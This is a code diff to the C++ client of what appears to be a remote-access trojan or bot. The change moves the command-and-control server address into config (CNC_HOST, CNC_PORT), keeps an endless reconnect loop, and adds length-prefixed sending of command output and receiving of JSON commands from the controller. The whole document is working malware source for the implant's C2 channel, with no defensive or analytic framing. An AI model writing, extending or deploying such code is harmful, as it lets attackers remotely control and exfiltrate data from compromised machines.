@@ -1,37 +1,37 @@
-#include <boost/asio.hpp>
+#include <nlohmann/json.hpp>
+#include "config.h"
 #include "client.h"
-
-using boost::asio::ip::tcp;
 
 void Client::Connect()
 {
-	boost::asio::ip::address addr = boost::asio::ip::address::from_string("127.0.0.1");
-	unsigned short port = 27016;
-	tcp::endpoint cnc(addr, port);
-
+	boost::asio::ip::tcp::resolver resolver(m_io);
 	try
 	{
-		m_sock.connect(cnc);
+		boost::asio::connect(m_sock, resolver.resolve(CNC_HOST, CNC_PORT));
 	}
 	catch (boost::system::system_error&)
 	{
 		m_sock.close();
-		Sleep(30 * 1000);
+		Sleep(RECONNECT_TO_CNC_INTERVAL_IN_SECONDS * 1000);
 		Connect();
 	}
 }
 
-void Client::Send(std::string&& data)
+void Client::Send(std::string data)
 {
 	if (data.empty())
-		m_sock.send(boost::asio::buffer("No output."));
+		data = "No output.";
+	size_t len = data.length();
+	m_sock.send(boost::asio::buffer(std::to_string(len)));
 	m_sock.send(boost::asio::buffer(data));
 }
 
-std::string Client::Receive()
+json Client::Receive()
 {
-	std::string data;
-	data.resize(1024);
-	m_sock.receive(boost::asio::buffer(data));
-	return data;
+	std::string len, buff;
+	len.resize(128);
+	m_sock.receive(boost::asio::buffer(len));
+	buff.resize(std::stoi(len));
+	m_sock.receive(boost::asio::buffer(buff));
+	return json::parse(buff);
 }
